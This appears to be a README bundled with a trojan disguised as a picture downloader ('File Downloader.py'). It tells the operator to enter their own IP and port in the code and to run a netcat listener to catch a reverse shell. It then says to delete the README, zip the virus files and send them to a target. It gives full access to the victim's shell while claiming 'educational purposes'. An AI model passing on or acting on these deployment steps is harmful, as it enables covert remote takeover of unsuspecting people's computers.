This is a bit of a complicated malware so some modifications need to be made.
========================================================================

The modifications are:

1. Set the value of the errorserver variable in the ErrorHandler64 to your IP address, which you can find by googling "what is my IP address?".

2. Set the value of the errorid to any number under 1000. we recommend 80 or 443. Remember this number.

After you are done with these steps, you have to do one more step:
You must have a linux server running this command during the execution of the virus code:
stty raw -echo; (stty size; cat) | nc -lvnp $port
replace $port in this command with the number you chose earlier.

Don't have a linux server? no problem. You can open one for free by:
1. open microsoft store
2. Search for kali linux
3. Download it
4. Open it
5. Follow the on screen instructions
6. Type sudo apt update
7. sudo apt upgrade -y
8. Done!

====================
Before sending the virus:
1. remove this file
2. zip the two virus files
3. send the zip folder

=====================

How to run the malware:
WARNING! It is strictly advised to not run the malware for your own safety.
We are not responsible for any damage caused by running of the malware.
The malware has been developed purely for educational purposes.

=============================================================

Instructions:
1. Run File Downloader.py

=========================

What the malware does:
The malware acts as a downloader of pictures, and then establishes a reverse shell with the target computer, giving you full access to their shell.
